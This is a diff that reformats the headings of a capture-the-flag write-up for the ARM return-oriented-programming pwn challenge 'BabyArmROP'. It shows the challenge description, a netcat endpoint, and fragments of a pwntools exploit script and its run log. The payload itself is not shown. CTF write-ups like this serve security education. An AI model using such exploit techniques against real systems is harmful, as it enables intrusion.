@@ -1,5 +1,9 @@
-# BabyArmROP
+## BabyArmROP
 
+Points: 738
+Solves: 28
+
+### Description:
 ```
 Can u take baby steps with your arms?
 flag location : /vuln/flag
@@ -9,7 +13,8 @@ nc pwn.zh3r0.cf 1111
 Download - BabyArmROP
 Author - codacker
 ```
-## C code
+
+### C code:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -31,7 +36,13 @@ int main() {
 }
 ```
 
-## exploit code
+## Analysis:
+
+
+## Solution:
+
+
+## Exploit code:
 ```python
 from pwn import *
 
@@ -144,7 +155,7 @@ s.sendline(buf)
 s.interactive()
 ```
 
-## result
+## Results:
 ```
 mito@ubuntu:~/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln$ python3 solve.py r
 [*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/vuln'
